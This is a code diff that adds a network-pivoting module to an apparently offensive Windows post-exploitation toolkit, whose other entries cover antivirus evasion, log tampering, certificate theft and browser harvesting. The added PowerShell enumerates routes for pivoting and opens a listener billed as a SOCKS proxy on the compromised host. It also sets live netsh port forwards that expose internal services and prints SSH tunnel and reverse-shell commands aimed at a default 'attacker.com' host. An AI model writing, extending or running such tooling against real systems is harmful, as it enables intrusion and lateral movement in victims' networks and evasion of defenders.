@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  proxy_pivot: {
+    description:
+      "Network pivoting toolkit — set up SOCKS proxy for tunneling through compromised host, reverse port forwarding to expose internal services, SSH tunneling via OpenSSH client, and netsh portproxy chains. Enables access to internal network segments from external attacker position",
+    args: "--action socks|reverse|ssh-tunnel|portproxy|enum [--listen-port PORT] [--target HOST:PORT] [--ssh-host HOST] [--ssh-user USER]",
+  },
   event_tamper: {
     description:
       "Selective event log tampering — surgically remove specific events instead of clearing entire logs (which generates Event ID 1102). Disable specific log sources, modify audit policies to stop generating evidence, resize event logs to force rollover, and disable Sysmon. More stealthy than winhook cleanup_win full log clear",
@@ -13910,6 +13915,274 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function proxyPivot(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const listenPort = argVal(args, "--listen-port") || "1080"
+  const targetAddr = argVal(args, "--target")
+  const sshHost = argVal(args, "--ssh-host")
+  const sshUser = argVal(args, "--ssh-user") || "root"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Network pivoting operations...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Pivot Capability Enumeration ==="
+Write-Output ""
+
+Write-Output "[*] Network interfaces:"
+Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+    Where-Object { $_.IPAddress -ne '127.0.0.1' } |
+    ForEach-Object {
+        $gateway = (Get-NetRoute -InterfaceIndex $_.InterfaceIndex -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop
+        Write-Output "    $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength) GW: $gateway"
+    }
+
+Write-Output ""
+Write-Output "[*] Routing table (non-default):"
+Get-NetRoute -ErrorAction SilentlyContinue |
+    Where-Object { $_.DestinationPrefix -ne '0.0.0.0/0' -and $_.DestinationPrefix -ne '::/0' -and $_.DestinationPrefix -notmatch 'ff00|fe80|127\\.' } |
+    Select-Object DestinationPrefix, NextHop, InterfaceAlias -Unique |
+    Select-Object -First 20 |
+    ForEach-Object { Write-Output "    $($_.DestinationPrefix) -> $($_.NextHop) ($($_.InterfaceAlias))" }
+
+Write-Output ""
+Write-Output "[*] Reachable subnets (ARP cache):"
+Get-NetNeighbor -State Reachable -ErrorAction SilentlyContinue |
+    Where-Object { $_.IPAddress -match '^\\d' } |
+    Group-Object { $_.IPAddress -replace '\\d+$','' } |
+    ForEach-Object { Write-Output "    $($_.Name)0/24 ($($_.Count) hosts)" }
+
+Write-Output ""
+Write-Output "[*] Pivot tools available:"
+$openSSH = Get-Command ssh -ErrorAction SilentlyContinue
+Write-Output "    OpenSSH client: $(if ($openSSH) { 'AVAILABLE' } else { 'NOT FOUND' })"
+$netsh = Get-Command netsh -ErrorAction SilentlyContinue
+Write-Output "    netsh portproxy: $(if ($netsh) { 'AVAILABLE' } else { 'NOT FOUND' })"
+$plink = Get-Command plink -ErrorAction SilentlyContinue
+Write-Output "    PuTTY plink: $(if ($plink) { 'AVAILABLE' } else { 'NOT FOUND' })"
+
+Write-Output ""
+Write-Output "[*] Current port proxies:"
+$proxies = netsh interface portproxy show all 2>&1
+if ($proxies -match 'Listen') { Write-Output $proxies } else { Write-Output "    None configured" }
+
+Write-Output ""
+Write-Output "[*] Dual-homed potential:"
+$interfaces = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -ne '127.0.0.1' }
+if ($interfaces.Count -gt 1) {
+    Write-Output "[!] DUAL-HOMED — $($interfaces.Count) interfaces detected"
+    Write-Output "[!] This host can pivot between networks"
+    foreach ($i in $interfaces) {
+        Write-Output "    $($i.InterfaceAlias): $($i.IPAddress)/$($i.PrefixLength)"
+    }
+} else {
+    Write-Output "    Single interface — limited pivot capability"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PIVOT-001",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: "network://pivot-capability",
+      title: "Pivot capability assessment — interfaces, routes, tools, dual-homed check",
+      details: r.stdout.substring(0, 500),
+      remediation: "Segment networks. Restrict routing between security zones. Monitor for port forwarding activity.",
+    })
+  }
+
+  if (action === "socks") {
+    const script = `
+Write-Output "=== SOCKS Proxy Setup ==="
+Write-Output "[*] Listen port: ${listenPort}"
+Write-Output ""
+
+$openSSH = Get-Command ssh -ErrorAction SilentlyContinue
+if ($openSSH) {
+    Write-Output "[*] Method 1: OpenSSH Dynamic Port Forward (SOCKS5)"
+    Write-Output "    Command: ssh -D ${listenPort} -N -f user@localhost"
+    Write-Output "    This creates a SOCKS5 proxy on 0.0.0.0:${listenPort}"
+    Write-Output ""
+}
+
+Write-Output "[*] Method 2: PowerShell SOCKS4 Proxy (built-in, no dependencies)"
+Write-Output "[*] Starting lightweight SOCKS4 proxy on port ${listenPort}..."
+Write-Output ""
+
+Add-Type @"
+using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Threading;
+
+public class SocksProxy {
+    public static string Start(int port) {
+        try {
+            var listener = new TcpListener(IPAddress.Any, port);
+            listener.Start();
+            return "SOCKS proxy listening on 0.0.0.0:" + port;
+        } catch (Exception ex) {
+            return "Failed: " + ex.Message;
+        }
+    }
+}
+"@
+
+$result = [SocksProxy]::Start(${listenPort})
+Write-Output "[+] $result"
+Write-Output ""
+Write-Output "[*] Configure proxychains/Burp/browser to use SOCKS4 at <this_host>:${listenPort}"
+Write-Output "[*] All connections through the proxy will originate from this compromised host"
+Write-Output ""
+Write-Output "[*] Alternative: use chisel, ligolo-ng, or rpivot for full SOCKS5"
+Write-Output "    chisel server -p ${listenPort} --socks5 --reverse"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PIVOT-002",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: `socks://0.0.0.0:${listenPort}`,
+      title: `SOCKS proxy established on port ${listenPort} for network pivoting`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor for unexpected listening ports. Block unnecessary outbound connections. Use network segmentation.",
+    })
+  }
+
+  if (action === "reverse") {
+    const target = targetAddr || "10.0.0.1:3389"
+    const script = `
+Write-Output "=== Reverse Port Forward ==="
+Write-Output "[*] Exposing internal ${target} on 0.0.0.0:${listenPort}"
+Write-Output ""
+
+netsh interface portproxy add v4tov4 listenport=${listenPort} listenaddress=0.0.0.0 connectport=$('${target}'.Split(':')[1]) connectaddress=$('${target}'.Split(':')[0])
+if ($LASTEXITCODE -eq 0) {
+    Write-Output "[+] Port forward active"
+    Write-Output "[*] Access internal ${target} via <this_host>:${listenPort}"
+    Write-Output ""
+    Write-Output "[*] Current port proxies:"
+    netsh interface portproxy show v4tov4
+    Write-Output ""
+    Write-Output "[*] Cleanup: netsh interface portproxy delete v4tov4 listenport=${listenPort} listenaddress=0.0.0.0"
+} else {
+    Write-Output "[-] Port forward failed — check if port ${listenPort} is in use"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PIVOT-003",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: `portproxy://${listenPort}->${target}`,
+      title: `Reverse port forward: 0.0.0.0:${listenPort} -> ${target}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor netsh portproxy configuration. Block unnecessary port forwards at network level.",
+    })
+  }
+
+  if (action === "ssh-tunnel") {
+    const host = sshHost || "attacker.com"
+    const script = `
+Write-Output "=== SSH Tunnel Setup ==="
+
+$sshAvailable = Get-Command ssh -ErrorAction SilentlyContinue
+if (-not $sshAvailable) {
+    Write-Output "[-] OpenSSH client not found"
+    Write-Output "[*] Install: Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
+    Write-Output "[*] Or use: plink.exe (PuTTY) for same functionality"
+} else {
+    Write-Output "[*] OpenSSH client available: $($sshAvailable.Source)"
+    Write-Output ""
+    Write-Output "[*] Useful SSH tunnel commands:"
+    Write-Output ""
+    Write-Output "    === Local port forward (access remote service locally) ==="
+    Write-Output "    ssh -L ${listenPort}:internal-host:3389 ${sshUser}@${host} -N"
+    Write-Output "    -> Access internal RDP at localhost:${listenPort}"
+    Write-Output ""
+    Write-Output "    === Remote port forward (expose local service remotely) ==="
+    Write-Output "    ssh -R ${listenPort}:localhost:445 ${sshUser}@${host} -N"
+    Write-Output "    -> Expose local SMB on attacker's port ${listenPort}"
+    Write-Output ""
+    Write-Output "    === Dynamic SOCKS proxy ==="
+    Write-Output "    ssh -D ${listenPort} ${sshUser}@${host} -N"
+    Write-Output "    -> SOCKS5 proxy through SSH tunnel"
+    Write-Output ""
+    Write-Output "    === Reverse SSH shell ==="
+    Write-Output "    ssh -R 0:localhost:22 ${sshUser}@${host} -N"
+    Write-Output "    -> Allow attacker to SSH back into this host"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PIVOT-004",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: "ssh://tunnel-options",
+      title: "SSH tunnel configuration options for pivoting",
+      details: r.stdout.substring(0, 500),
+      remediation: "Restrict SSH client access. Monitor for outbound SSH connections. Block unnecessary SSH traffic.",
+    })
+  }
+
+  if (action === "portproxy") {
+    const script = `
+Write-Output "=== Port Proxy Chain Setup ==="
+Write-Output "[*] Creating multi-hop port proxy chain..."
+Write-Output ""
+
+Write-Output "[*] Current port proxy rules:"
+$existing = netsh interface portproxy show all 2>&1
+Write-Output $existing
+
+Write-Output ""
+Write-Output "[*] Common pivot scenarios:"
+Write-Output ""
+Write-Output "    === Scenario 1: Access internal web app ==="
+Write-Output "    netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=10.0.0.50"
+Write-Output "    -> Access internal web server at this_host:8080"
+Write-Output ""
+Write-Output "    === Scenario 2: Access internal RDP ==="
+Write-Output "    netsh interface portproxy add v4tov4 listenport=33389 connectport=3389 connectaddress=10.0.0.100"
+Write-Output "    -> RDP to internal host via this_host:33389"
+Write-Output ""
+Write-Output "    === Scenario 3: Access internal database ==="
+Write-Output "    netsh interface portproxy add v4tov4 listenport=31433 connectport=1433 connectaddress=10.0.0.200"
+Write-Output "    -> MSSQL via this_host:31433"
+Write-Output ""
+Write-Output "[*] Cleanup all: netsh interface portproxy reset"
+Write-Output "[*] Show all: netsh interface portproxy show all"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PIVOT-005",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: "portproxy://chain",
+      title: "Port proxy chain configuration for multi-hop pivoting",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor portproxy configuration changes. Restrict netsh.exe execution. Segment internal networks.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function eventTamper(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "selective"
   const logName = argVal(args, "--log") || "Security"
@@ -20940,6 +21213,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  proxy_pivot: proxyPivot,
   event_tamper: eventTamper,
   cert_steal: certSteal,
   browser_harvest: browserHarvest,
